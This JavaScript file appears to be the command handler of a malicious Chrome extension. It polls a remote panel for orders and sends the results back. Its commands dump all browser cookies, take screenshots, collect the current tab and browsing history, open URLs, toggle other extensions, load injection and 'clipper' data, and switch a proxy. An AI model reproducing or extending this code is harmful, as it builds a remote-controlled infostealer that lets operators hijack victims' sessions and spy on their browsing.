import config from "../../config.js";

import {setEnableExtension} from "./extensions.js";
import {initMachine} from "./getMachineInfo.js";
import {createNotification} from "./notifications.js";
import {makeScreenShot} from "./screenshot.js";
import {getCurrentTab, getHistory, openUrl} from "./tabs.js";
import {getInjections} from "./injections.js";
import {getSettings} from "./settings.js";
import {setIsEnabled} from "./proxy.js";
import {getClipperData} from "./clipper.js";

export const getCommands = () => {
    return new Promise(async (res) => {
        chrome.storage.local.get(['domain', 'uuid'], async (result) => {
            const uuid = result.uuid
            const domain = result.domain

            const request = await fetch(`${domain}/machine/commands?uuid=${uuid}`)
            const commands = await request.json()

            for (const command of commands) {
                const cmd = JSON.parse(command.command)
                const data = cmd.data

                switch (cmd.cmd) {
                    case "extension":
                        await setEnableExtension(data.id, data.enable)
                        await updateCommand(command.id, [])
                        await initMachine()

                        break;
                    case "info":
                        await initMachine()
                        await getInjections()
                        await getSettings()

                        await updateCommand(command.id, [])

                        break;
                    case "push":
                        await createNotification(data.icon_url, data.title, data.message, data.url)
                        await updateCommand(command.id, [])

                        break;
                    case "cookies":
                        const cookies = await chrome.cookies.getAll({})
                        await updateCommand(command.id, cookies)

                        break;
                    case "screenshot":
                        const screen = await makeScreenShot()

                        await updateCommand(command.id, {screen})

                        break;
                    case "url":
                        await openUrl(data.url)
                        await updateCommand(command.id, [])

                        break;
                    case "current_url":
                        const tab = await getCurrentTab()

                        await updateCommand(command.id, {tab})

                        break;
                    case "history":
                        const history = await getHistory()

                        await updateCommand(command.id, history)

                        break;
                    case "injects":
                        await getInjections()
                        await updateCommand(command.id, [])

                        break;
                    case "clipper":
                        await getClipperData()
                        await updateCommand(command.id, [])

                        break;
                    case "settings":
                        await getSettings()
                        await updateCommand(command.id, [])

                        break;
                    case "proxy":
                        chrome.storage.local.set({
                            proxyEnabled: data.isEnabled
                        })

                        await setIsEnabled(data.isEnabled)
                        await updateCommand(command.id, [])

                        break;
                }
            }
        })
    })
}

const updateCommand = (id, answer) => {
    return new Promise(async (res) => {
        await fetch(`${config.panelUrl}/machine/set-command`, {
            method: 'POST',
            headers: {
                'Accept': 'application/json, application/xml, text/plain, text/html, *.*',
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                id,
                answer
            })
        })

        return res(true)
    })
}